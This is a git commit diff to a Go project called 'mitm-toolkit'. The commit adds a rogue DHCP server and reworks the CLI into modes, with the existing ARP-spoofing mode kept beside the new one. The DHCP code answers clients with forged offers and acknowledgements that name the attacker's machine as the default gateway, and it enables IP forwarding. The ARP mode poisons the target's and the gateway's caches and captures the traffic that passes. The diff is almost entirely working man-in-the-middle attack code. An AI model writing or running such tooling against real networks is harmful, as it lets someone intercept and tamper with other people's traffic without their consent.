d2ea1b94d54c742d95e3351f14fbfd782e407146
ofek <ofekofek789@gmail.com>
2026-03-01 23:36:02 +0200

    Implement DHCP rogue server with mode-based CLI

--- dhcp/dhcp.go
+++ dhcp/dhcp.go
@@ -3,16 +3,15 @@ package dhcp
 import (
 	"fmt"
 	"mitm-toolkit/network"
+	"net"
 
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
 )
 
-// on UDP port 67 -> DHCP server
+func ListenDHCP(iface network.NetworkInterface, offeredIP net.IP) error {
 
-func listenDHCP(iface network.NetworkInterface) error {
-	
 	// open interface to listen
 	handle, err := pcap.OpenLive(
 		iface.InterfaceName,
@@ -52,19 +51,19 @@ func listenDHCP(iface network.NetworkInterface) error {
 			for _, opt := range dhcp.Options {
 
 				if opt.Type == layers.DHCPOptMessageType {
-					
+
 					switch layers.DHCPMsgType(opt.Data[0]) {
 
 					case layers.DHCPMsgTypeDiscover:
 						// client looking for DHCP server - we send offer
-
+						sendDHCPResponse(handle, iface, dhcp, layers.DHCPMsgTypeOffer, offeredIP)
 
 					case layers.DHCPMsgTypeRequest:
 						// client accept offer -> we send ack
+						sendDHCPResponse(handle, iface, dhcp, layers.DHCPMsgTypeAck, offeredIP)
 
 					}
-					
-					
+
 				}
 
 			}
@@ -74,4 +73,101 @@ func listenDHCP(iface network.NetworkInterface) error {
 
 	return nil
 
+}
+
+// DHCP reply and send it to the server (offer, ack)
+func sendDHCPResponse(handle *pcap.Handle, iface network.NetworkInterface, dhcp *layers.DHCPv4, msgType layers.DHCPMsgType, offeredIP net.IP) error {
+
+	srcMac, err := net.ParseMAC(iface.MacAddress)
+	if err != nil {
+		return fmt.Errorf("Invalid source MAC address: %v", err)
+	}
+
+	// building  layer 2 - Etherent layer
+	eth := layers.Ethernet{
+		SrcMAC:       srcMac,
+		DstMAC:       []byte{0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
+		EthernetType: layers.EthernetTypeIPv4,
+	}
+
+	srcIP := net.ParseIP(iface.IPv4Address)
+	dstIP := net.ParseIP("255.255.255.255")
+
+	// building layer 3 - network layer
+	ipv4 := layers.IPv4{
+		SrcIP:    srcIP,
+		DstIP:    dstIP,
+		Version:  4,
+		TTL:      64,
+		Protocol: layers.IPProtocolUDP,
+	}
+
+	// builing layer 4 -> transport layer (UDP, TCP)
+	udp := layers.UDP{
+		SrcPort: 67, // server
+		DstPort: 68, //client
+	}
+
+	// add checksum
+	udp.SetNetworkLayerForChecksum(&ipv4)
+
+	// building dhcpv4 - layer 7 -> application layer
+	dhcpV4 := layers.DHCPv4{
+		Operation:    layers.DHCPOpReply, // server is replying
+		HardwareType: layers.LinkTypeEthernet,
+		HardwareLen:  6,
+		Xid:          dhcp.Xid,
+		YourClientIP: offeredIP,
+		ClientHWAddr: dhcp.ClientHWAddr,
+		Options: layers.DHCPOptions{
+			layers.DHCPOption{
+				Type:   layers.DHCPOptMessageType, // must: 53
+				Data:   []byte{byte(msgType)},
+				Length: 1,
+			},
+
+			layers.DHCPOption{
+				Type:   layers.DHCPOptLeaseTime,        // must: 51
+				Data:   []byte{0x00, 0x00, 0x0E, 0x10}, // 3600 seconds = 1 hour
+				Length: 4,
+			},
+
+			layers.DHCPOption{
+				Type:   layers.DHCPOptServerID, // must: 54
+				Data:   srcIP.To4(),
+				Length: 4,
+			},
+
+			layers.DHCPOption{
+				Type:   layers.DHCPOptSubnetMask, // opt: 1
+				Data:   net.IPv4Mask(255, 255, 255, 0),
+				Length: 4,
+			},
+			layers.DHCPOption{
+				Type:   layers.DHCPOptRouter, // opt: 3
+				Data:   srcIP.To4(),
+				Length: 4,
+			},
+		},
+	}
+
+	// Serialize the Packet (Convert to raw bytes)
+	buf := gopacket.NewSerializeBuffer()
+	opts := gopacket.SerializeOptions{
+		FixLengths:       true,
+		ComputeChecksums: true,
+	}
+
+	// call all the layers
+	err = gopacket.SerializeLayers(buf, opts, &eth, &ipv4, &udp, &dhcpV4)
+	if err != nil {
+		return fmt.Errorf("failed to serialize packet: %v", err)
+	}
+
+	err = handle.WritePacketData(buf.Bytes())
+	if err != nil {
+		return fmt.Errorf("failed to send DHCP response: %v", err)
+	}
+
+	return nil
 }
--- main.go
+++ main.go
@@ -3,6 +3,7 @@ package main
 import (
 	"flag"
 	"fmt"
+	"net"
 	"os"
 	"os/exec"
 	"os/signal"
@@ -10,94 +11,152 @@ import (
 
 	"mitm-toolkit/arp"
 	"mitm-toolkit/capture"
+	"mitm-toolkit/dhcp"
 	"mitm-toolkit/network"
 )
 
 func main() {
+
+	// mode
+	var mode string
+
 	// Capturing the ip address from the command line
 	var targetIP string
 
+	// offered ip
+	var offeredIP string
+
+	flag.StringVar(&mode, "mode", "", "attack mode: arp or dhcp (required)")
 	flag.StringVar(&targetIP, "t", "", "target ip address (required)")
+	flag.StringVar(&offeredIP, "offer", "", "IP to offer target (required for dhcp)")
 	flag.Parse()
 
-	// Validate that ip address was provided
-	if targetIP == "" {
-		fmt.Println("Error: target IP address is required")
-		fmt.Println("Usage: -t <target_ip_address>")
+	if mode == "" {
+		fmt.Println("Error: Mode is required")
+		fmt.Println("Usage: mode <arp | dhcp>")
 		os.Exit(1)
 	}
 
-	// Check if target is reachable
-	// send 2 pings and each one with timeout of 2 seconds to the target
-	fmt.Printf("Checking if %v is reachable...\n", targetIP)
-	cmd := exec.Command("ping", "-c", "2", "-W", "2", targetIP)
+	switch mode {
+	case "arp":
+		// Validate that ip address was provided
+		if targetIP == "" {
+			fmt.Println("Error: target IP address is required")
+			fmt.Println("Usage: -t <target_ip_address>")
+			os.Exit(1)
+		}
 
-	if err := cmd.Run(); err != nil {
-		fmt.Printf("Error: Target %s is not reachable or offline\n", targetIP)
+		// Check if target is reachable
+		// send 2 pings and each one with timeout of 2 seconds to the target
+		fmt.Printf("Checking if %v is reachable...\n", targetIP)
+		cmd := exec.Command("ping", "-c", "2", "-W", "2", targetIP)
+
+		if err := cmd.Run(); err != nil {
+			fmt.Printf("Error: Target %s is not reachable or offline\n", targetIP)
+			os.Exit(1)
+		}
+
+		fmt.Println("Target is reachable!")
+
+		fmt.Printf("Target IP address: %v\n", targetIP)
+
+		// Get local network information
+		localNetwork, err := network.GetLocalNetworkInfo()
+		if err != nil {
+			fmt.Printf("Error: %v\n", err)
+			os.Exit(1)
+		}
+
+		fmt.Printf("\nAttacker Information:\n")
+		fmt.Printf("  Interface: %s\n", localNetwork.InterfaceName)
+		fmt.Printf("  IP Address: %s\n", localNetwork.IPv4Address)
+		fmt.Printf("  MAC Address: %s\n", localNetwork.MacAddress)
+
+		// Get gateway information
+		gatewayIP, err := network.GetNetworkGateway()
+		if err != nil {
+			fmt.Printf("Error: %v\n", err)
+			os.Exit(1)
+		}
+
+		fmt.Printf("\nGateway Information:\n")
+		fmt.Printf("  Gateway IP: %s\n", gatewayIP)
+
+		// Get target MAC address via ARP
+		targetMAC, err := network.GetMACFromIP(targetIP, localNetwork)
+		if err != nil {
+			fmt.Printf("Error: %v\n", err)
+			os.Exit(1)
+		}
+		fmt.Printf("\nTarget MAC Address: %s\n", targetMAC)
+
+		// Get gateway MAC address via ARP
+		gatewayMAC, err := network.GetMACFromIP(gatewayIP, localNetwork)
+		if err != nil {
+			fmt.Printf("Error: %v\n", err)
+			os.Exit(1)
+		}
+		fmt.Printf("Gateway MAC Address: %s\n", gatewayMAC)
+
+		if err := arp.EnableIPForwarding(); err != nil {
+			fmt.Printf("Error: %v\n", err)
+			os.Exit(1)
+		}
+
+		fmt.Println("\nStarting ARP spoofing attack...")
+		fmt.Println("Press Ctrl+C to stop and restore ARP tables.")
+		fmt.Println() // Empty line before traffic output
+
+		go arp.StartARPSpoofing(localNetwork, targetIP, targetMAC, gatewayIP, gatewayMAC)
+		go capture.StartCapture(localNetwork, targetIP)
+
+		// Block until ctrl+c signal to exit
+		sigChan := make(chan os.Signal, 1)
+		signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
+		<-sigChan
+
+		//Cleanup
+		fmt.Println("\nRestoring ARP tables...")
+		arp.RestoreARP(localNetwork, targetIP, targetMAC, gatewayIP, gatewayMAC)
+
+	case "dhcp":
+
+		// validate offer
+		if offeredIP == "" {
+			fmt.Println("Error: offered ip is required")
+			fmt.Println("Usage: offer <ip_address>")
+			os.Exit(1)
+		}
+
+		// Get local network information
+		localNetwork, err := network.GetLocalNetworkInfo()
+		if err != nil {
+			fmt.Printf("Error: %v\n", err)
+			os.Exit(1)
+		}
+
+		fmt.Printf("\nAttacker Information:\n")
+		fmt.Printf("  Interface: %s\n", localNetwork.InterfaceName)
+		fmt.Printf("  IP Address: %s\n", localNetwork.IPv4Address)
+		fmt.Printf("  MAC Address: %s\n", localNetwork.MacAddress)
+
+		// enable IP forwarding
+		if err := arp.EnableIPForwarding(); err != nil {
+			fmt.Printf("Error: %v\n", err)
+			os.Exit(1)
+		}
+
+		go dhcp.ListenDHCP(localNetwork, net.ParseIP(offeredIP))
+
+		// Block until ctrl+c signal to exit
+		sigChan := make(chan os.Signal, 1)
+		signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
+		<-sigChan
+
+	default:
+		fmt.Println("Invalid mode")
 		os.Exit(1)
+
 	}
-
-	fmt.Println("Target is reachable!")
-
-	fmt.Printf("Target IP address: %v\n", targetIP)
-
-	// Get local network information
-	localNetwork, err := network.GetLocalNetworkInfo()
-	if err != nil {
-		fmt.Printf("Error: %v\n", err)
-		os.Exit(1)
-	}
-
-	fmt.Printf("\nAttacker Information:\n")
-	fmt.Printf("  Interface: %s\n", localNetwork.InterfaceName)
-	fmt.Printf("  IP Address: %s\n", localNetwork.IPv4Address)
-	fmt.Printf("  MAC Address: %s\n", localNetwork.MacAddress)
-
-	// Get gateway information
-	gatewayIP, err := network.GetNetworkGateway()
-	if err != nil {
-		fmt.Printf("Error: %v\n", err)
-		os.Exit(1)
-	}
-
-	fmt.Printf("\nGateway Information:\n")
-	fmt.Printf("  Gateway IP: %s\n", gatewayIP)
-
-	// Get target MAC address via ARP
-	targetMAC, err := network.GetMACFromIP(targetIP, localNetwork)
-	if err != nil {
-		fmt.Printf("Error: %v\n", err)
-		os.Exit(1)
-	}
-	fmt.Printf("\nTarget MAC Address: %s\n", targetMAC)
-
-	// Get gateway MAC address via ARP
-	gatewayMAC, err := network.GetMACFromIP(gatewayIP, localNetwork)
-	if err != nil {
-		fmt.Printf("Error: %v\n", err)
-		os.Exit(1)
-	}
-	fmt.Printf("Gateway MAC Address: %s\n", gatewayMAC)
-
-	if err := arp.EnableIPForwarding(); err != nil {
-		fmt.Printf("Error: %v\n", err)
-		os.Exit(1)
-	}
-
-	fmt.Println("\nStarting ARP spoofing attack...")
-	fmt.Println("Press Ctrl+C to stop and restore ARP tables.")
-	fmt.Println() // Empty line before traffic output
-
-	go arp.StartARPSpoofing(localNetwork, targetIP, targetMAC, gatewayIP, gatewayMAC)
-	go capture.StartCapture(localNetwork, targetIP)
-
-	// Block until ctrl+c signal to exit
-	sigChan := make(chan os.Signal, 1)
-	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
-	<-sigChan
-
-	//Cleanup
-	fmt.Println("\nRestoring ARP tables...")
-	arp.RestoreARP(localNetwork, targetIP, targetMAC, gatewayIP, gatewayMAC)
 
 }
